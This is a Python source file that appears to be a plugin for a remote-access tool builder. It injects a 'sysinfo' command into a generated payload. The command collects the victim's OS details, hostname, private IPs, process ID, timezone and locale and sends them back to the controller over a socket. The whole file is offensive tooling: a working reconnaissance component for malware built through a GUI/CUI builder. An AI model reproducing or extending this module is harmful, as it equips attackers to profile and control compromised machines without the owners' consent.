# GUI + CUI
# done
import library.modules.config as config

config.main()
interface = config.interface


def main(option):
    if option == 'generate':
        config.import_statements.append('from platform import uname, win32_ver')
        config.import_statements.append('import socket')
        config.import_statements.append('from os import getpid')
        config.import_statements.append('from datetime import datetime')
        config.import_statements.append('from time import gmtime, strftime')
        config.import_statements.append('from locale import getdefaultlocale')
        config.functions.append('''
def sysinfo():
    platform_uname = uname()
    platform_win32 = win32_ver()
    private_ips = [str(i[4][0]) for i in socket.getaddrinfo(socket.gethostname(), None)]
    data = '[*]System Information : \\n'
    data += '   OS             : ' + str(platform_uname[0]) + '\\n'
    data += '   Release        : ' + str(platform_uname[2]) + '\\n'
    data += '   Exact Version  : ' + str(platform_uname[3]) + '\\n'
    data += '   Node Name      : ' + str(platform_uname[1]) + '\\n'
    data += '   Machine Type   : ' + str(platform_uname[4]) + '\\n'
    data += '   Processor Type : ' + str(platform_uname[5]) + '\\n'
    data += '   OS Type        : ' + str(platform_win32[3]) + '\\n'
    data += '   Private IPs    : ' + ', '.join(private_ips) + '\\n'
    data += '   Process ID     : ' + str(getpid()) + '\\n'
    data += '   System time    : ' + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + '\\n'
    data += '   Timezone       : ' + str(strftime("%z", gmtime())) + '\\n'
    data += '   Language       : ' + str(' '.join(getdefaultlocale())) + '\\n'
    send_all(s,data)''')
        config.logics.append('''
            elif command == "sysinfo":
                sysinfo()''')
        config.help_menu['sysinfo'] = 'Grabs system info and displays it'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "System Information Grabber component",
                "OS": "Windows",
                "Required Modules": "platform, socket, os, datetime, time, locale",
                "Commands": "sysinfo",
                "Description": "Grabs system info and displays it"}
        elif interface == "CUI":
            print('\nName             : System Information Grabber component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : platform, socket, os, datetime, time, locale' \
                  '\nCommands         : sysinfo' \
                  '\nDescription      : Grabs system info and displays it\n')
